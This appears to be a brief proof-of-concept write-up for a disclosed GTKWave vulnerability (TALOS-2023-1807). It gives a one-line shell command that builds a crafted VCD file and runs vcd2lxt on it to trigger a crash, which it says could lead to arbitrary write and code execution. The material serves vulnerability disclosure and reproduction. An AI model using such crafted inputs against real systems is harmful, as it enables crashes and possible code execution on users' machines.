# GTKWave VCD Sorted Bsearch Arbitrary Write Vulnerabilities (TALOS-2023-1807)

## POC URL
https://gtkwave.sourceforge.net

## Compilation Environment
- GTKWave 3.3.115 (vulnerable version)
- Tested on Linux (32-bit or 64-bit)

## Run Command
```
echo -e '$var reg 2 x x $end\n$var reg 2 x x $end\n$enddefinitions\np a a A' > poc.vcd && vcd2lxt poc.vcd
```

## Expected Output
- The vulnerable GTKWave utility (vcd2lxt) will crash due to a segmentation fault when attempting to dereference an arbitrary memory address
- The crash occurs because the sorted buffer is not initialized before calling bsearch, leading to an arbitrary read that could be turned into an arbitrary write
- Successful exploitation could lead to arbitrary code execution
